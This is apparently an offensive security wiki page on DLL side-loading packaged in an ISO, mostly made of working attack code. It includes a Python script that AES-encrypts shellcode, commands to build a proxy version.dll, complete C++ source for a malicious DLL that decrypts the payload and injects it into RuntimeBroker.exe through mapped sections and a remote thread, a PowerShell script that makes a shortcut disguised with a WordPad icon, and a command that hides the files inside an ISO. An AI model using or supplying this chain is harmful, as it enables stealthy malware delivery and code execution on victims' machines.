# DLL Side-Loading

- [https://github.com/XForceIR/SideLoadHunter/tree/main/SideLoads](https://github.com/XForceIR/SideLoadHunter/tree/main/SideLoads)

{% embed url="https://youtu.be/3eROsG_WNpE" %}




## Combining with ISO Packing

- [https://unit42.paloaltonetworks.com/brute-ratel-c4-tool/](https://unit42.paloaltonetworks.com/brute-ratel-c4-tool/)
- [https://blog.sunggwanchoi.com/recreating-an-iso-payload-for-fun-and-no-profit/](https://blog.sunggwanchoi.com/recreating-an-iso-payload-for-fun-and-no-profit/)
- [https://github.com/ChoiSG/OneDriveUpdaterSideloading](https://github.com/ChoiSG/OneDriveUpdaterSideloading)

Encrypt your payload:

{% code title="enc.py" %}
```python
from os import urandom
from hashlib import sha256
from Crypto.Cipher import AES

KEY = urandom(16)

def pad(s):
	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

def aesenc(plaintext, key):
	cipher = AES.new(sha256(key).digest(), AES.MODE_CBC, 16 * '\x00')
	return cipher.encrypt(bytes(pad(plaintext)))

with open('shellcode.bin', 'rb') as f:
	plaintext = f.read()

print('key[] = { 0x' + ',0x'.join(hex(ord(x))[2:] for x in KEY) + ' };')
with open('enc', 'wb') as f:
	f.write(aesenc(plaintext, KEY))
```
{% endcode %}

Generate a proxy DLL with [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy):

```
Cmd > SharpDllProxy.exe --dll C:\Windows\System32\version.dll --payload OneDrive.Update
Cmd > move output_version\tmp1F94.dll C:\out\vresion.dll
```

Compile a malicious DLL (stolen from [injectopi](https://github.com/peperunas/injectopi/tree/master/CreateSection)):

{% code title="dllmain.cpp" %}
```cpp
#include "pch.h"
#include <stdlib.h>
#include <wincrypt.h>
#include <Windows.h>
#include <TlHelp32.h>
#include "CreateSection.h"

#pragma comment(lib, "ntdll")

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

/*
...pragma export redirections from version_pragma.c...
*/

BOOL LoadNtdllFunctions() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");

    ZwOpenProcess = (NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID))GetProcAddress(ntdll, "ZwOpenProcess");
    if (ZwOpenProcess == NULL) return FALSE;

    ZwCreateSection = (NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE))GetProcAddress(ntdll, "ZwCreateSection");
    if (ZwCreateSection == NULL) return FALSE;

    NtMapViewOfSection = (NTSTATUS(NTAPI*)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG))GetProcAddress(ntdll, "ZwMapViewOfSection");
    if (NtMapViewOfSection == NULL) return FALSE;

    ZwCreateThreadEx = (NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, ULONG_PTR, SIZE_T, SIZE_T, PVOID))GetProcAddress(ntdll, "ZwCreateThreadEx");
    if (ZwCreateThreadEx == NULL) return FALSE;

    NtDelayExecution = (NTSTATUS(NTAPI*)(BOOL, PLARGE_INTEGER))GetProcAddress(ntdll, "ZwDelayExecution");
    if (NtDelayExecution == NULL) return FALSE;

    ZwClose = (NTSTATUS(NTAPI*)(HANDLE))GetProcAddress(ntdll, "ZwClose");
    if (ZwClose == NULL) return FALSE;

    return TRUE;
}

HANDLE GetProcHandlebyName(const char* procName) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    NTSTATUS status = NULL;
    HANDLE hProc = 0;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (Process32First(snapshot, &entry)) {
        do {
            if (strcmp((entry.szExeFile), procName) == 0) {
                OBJECT_ATTRIBUTES oa;
                CLIENT_ID cid = { (HANDLE)entry.th32ProcessID, NULL };
                InitializeObjectAttributes(&oa, nullptr, 0, nullptr, nullptr);

                status = ZwOpenProcess(&hProc, PROCESS_ALL_ACCESS, &oa, &cid);

                if (!NT_SUCCESS(status))
                    continue;

                return hProc;
            }
        } while (Process32Next(snapshot, &entry));
    }
    ZwClose(snapshot);

    return NULL;
}

// Credit: Sektor7 RTO Malware Essential Course
int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return -1;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) return -1;
    if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) return -1;
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) return -1;
    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&payload_len)) return -1;

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}

DWORD WINAPI Run(LPVOID lpParameter) {
    if (LoadNtdllFunctions() == FALSE)
        return -1;

    HANDLE hProc = GetProcHandlebyName("RuntimeBroker.exe");
    if (hProc == NULL)
        return -1;

    FILE* fp;
    size_t shellcodeSize;
    unsigned char* shellcode;
    fp = fopen("OneDrive.Update", "rb");
    fseek(fp, 0, SEEK_END);
    shellcodeSize = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    shellcode = (unsigned char*)malloc(shellcodeSize);
    fread(shellcode, shellcodeSize, 1, fp);

    char key[] = { 0x31,0x33,0x33,0x37 };
    AESDecrypt((char*)shellcode, shellcodeSize, key, sizeof(key));

    HANDLE hSection = NULL;
    SIZE_T size = shellcodeSize;
    LARGE_INTEGER sectionSize = { size };
    NTSTATUS status = NULL;

    if ((status = ZwCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS)
        return -1;

    PVOID pLocalView = NULL, pRemoteView = NULL;
    if ((status = NtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalView, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE)) != STATUS_SUCCESS)
        return -1;

    memcpy(pLocalView, shellcode, shellcodeSize);

    if ((status = NtMapViewOfSection(hSection, hProc, &pRemoteView, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
        return -1;

    LARGE_INTEGER interval;
    interval.QuadPart = -1 * (int)(4270 * 10000.0f);

    if ((status = NtDelayExecution(TRUE, &interval)) != STATUS_SUCCESS)
        return -1;

    HANDLE hThread = NULL;
    if ((status = ZwCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProc, pRemoteView, NULL, CREATE_SUSPENDED, 0, 0, 0, 0)) != STATUS_SUCCESS)
        return -1;

    ResumeThread(hThread);

    interval.QuadPart = -1 * (int)(4270 * 10000.0f);
    if ((status = NtDelayExecution(TRUE, &interval)) != STATUS_SUCCESS)
        return -1;

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    HANDLE threadHandle;

    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        threadHandle = CreateThread(NULL, 0, Run, NULL, 0, NULL);
        CloseHandle(threadHandle);
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        Sleep(5000);
        break;
    }

    return TRUE;
}
```
{% endcode %}

Create a malicious link:

```powershell
$obj = New-object -comobject wscript.shell
$link = $obj.createshortcut("C:\out\clickme.lnk")
$link.windowstyle = "7"
$link.targetpath = "%windir%/system32/cmd.exe"
$link.iconlocation = "C:\Program Files (x86)\Windows NT\Accessories\WordPad.exe"
$link.arguments = "/c start OneDriveStandaloneUpdater.exe"
$link.save()
```

Pack all the files into an ISO with [PackMyPayload](https://github.com/mgeeky/PackMyPayload):

```
PS > python .\PackMyPayload.py C:\out\ C:\out\openme.iso --out-format iso --hide OneDrive.Update,OneDriveStandaloneUpdater.exe,version.dll,vresion.dll
```
